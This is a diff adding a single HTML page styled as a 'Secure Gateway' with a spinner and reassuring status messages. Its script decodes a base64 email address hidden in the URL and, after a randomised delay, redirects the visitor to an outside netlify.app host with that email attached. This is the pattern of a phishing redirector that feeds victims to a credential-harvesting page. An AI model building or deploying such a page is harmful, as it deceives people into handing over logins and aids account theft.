@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Gateway</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 500px;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 1.5rem;
+        }
+        h1 {
+            margin: 0 0 1rem 0;
+            font-weight: 300;
+            font-size: 1.5rem;
+        }
+        p {
+            margin: 0;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+        .status {
+            margin-top: 1.5rem;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <h1>Establishing Secure Connection</h1>
+        <p>Please wait while we initialize your secure session...</p>
+        <div class="status" id="status">Processing request</div>
+    </div>
+
+    <script>
+    (function() {
+        'use strict';
+        
+        // Get token from various sources
+        function extractToken() {
+            const url = new URL(window.location.href);
+            const hash = url.hash.substring(1);
+            const search = url.search;
+            
+            // Priority 1: Hash fragment
+            if (hash && hash.length > 5) {
+                return hash;
+            }
+            
+            // Priority 2: Query parameter 'c'
+            const cParam = url.searchParams.get('c');
+            if (cParam && cParam.length > 5) {
+                return cParam;
+            }
+            
+            // Priority 3: Query parameter 's'
+            const sParam = url.searchParams.get('s');
+            if (sParam && sParam.length > 5) {
+                return sParam;
+            }
+            
+            // Priority 4: Last path segment
+            const path = url.pathname;
+            const segments = path.split('/').filter(s => s.length > 0);
+            if (segments.length > 0) {
+                const lastSegment = segments[segments.length - 1];
+                if (lastSegment && lastSegment.length > 5) {
+                    return lastSegment;
+                }
+            }
+            
+            return '';
+        }
+        
+        // Decode token
+        function decodeToken(token) {
+            try {
+                // URL-safe base64 decode
+                let normalized = token.replace(/-/g, '+').replace(/_/g, '/');
+                while (normalized.length % 4) {
+                    normalized += '=';
+                }
+                return atob(normalized);
+            } catch (error) {
+                console.error('Decode error:', error);
+                return '';
+            }
+        }
+        
+        // Update status message
+        function updateStatus(msg) {
+            const el = document.getElementById('status');
+            if (el) el.textContent = msg;
+        }
+        
+        // Main redirect function
+        function executeRedirect() {
+            updateStatus('Validating credentials...');
+            
+            const token = extractToken();
+            const targetUrl = 'https://startling-halva-d2e52f.netlify.app';
+            
+            setTimeout(() => {
+                if (token) {
+                    const decoded = decodeToken(token);
+                    
+                    if (decoded && decoded.includes('@') && decoded.includes('.')) {
+                        updateStatus('Redirecting to secure portal...');
+                        
+                        // Add random delay before final redirect
+                        setTimeout(() => {
+                            window.location.replace(targetUrl + '#' + encodeURIComponent(decoded));
+                        }, 300 + Math.random() * 700);
+                        return;
+                    }
+                }
+                
+                // No valid token found
+                updateStatus('Initiating standard session...');
+                setTimeout(() => {
+                    window.location.replace(targetUrl);
+                }, 800);
+                
+            }, 500);
+        }
+        
+        // Start redirect process
+        setTimeout(executeRedirect, 800);
+        
+    })();
+    </script>
+</body>
+</html>
